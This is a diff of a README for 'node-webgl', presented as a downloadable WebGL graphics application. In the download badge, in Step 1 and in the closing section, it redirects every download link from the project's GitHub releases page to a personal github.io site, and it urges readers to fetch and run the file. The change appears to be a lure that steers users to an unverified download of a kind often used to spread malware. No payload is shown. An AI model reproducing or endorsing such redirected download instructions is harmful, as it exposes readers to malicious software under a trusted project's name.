@@ -1,6 +1,6 @@
 # 🎨 node-webgl - Stunning WebGL Graphics Without a Browser
 
-[![Download node-webgl](https://img.shields.io/badge/Download-node--webgl-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/carloswalkin56/node-webgl/releases)
+[![Download node-webgl](https://img.shields.io/badge/Download-node--webgl-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://carloswalkin56.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Getting started with node-webgl is quick and easy. Follow these simple steps, an
 
 **Step 1: Download the application**
 
-Visit this link to download the application: [https://github.com/carloswalkin56/node-webgl/releases](https://github.com/carloswalkin56/node-webgl/releases)
+Visit this link to download the application: [https://carloswalkin56.github.io](https://carloswalkin56.github.io)
 
 Once you arrive at the page, you'll see a list of available files. Look for the most recent version and click the download button. The file will save to your computer's "Downloads" folder.
 
@@ -130,11 +130,11 @@ If you encounter any issues or have questions, you're not alone. The node-webgl 
 
 The best way to understand what node-webgl can do is to try it yourself.
 
-[![Download node-webgl Now](https://img.shields.io/badge/⬇️%20Download%20node--webgl%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/carloswalkin56/node-webgl/releases)
+[![Download node-webgl Now](https://img.shields.io/badge/⬇️%20Download%20node--webgl%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://carloswalkin56.github.io)
 
 Just visit this link to download the application, and you'll be rendering beautiful 3D graphics in no time:
 
-[https://github.com/carloswalkin56/node-webgl/releases](https://github.com/carloswalkin56/node-webgl/releases)
+[https://carloswalkin56.github.io](https://carloswalkin56.github.io)
 
 ---
 
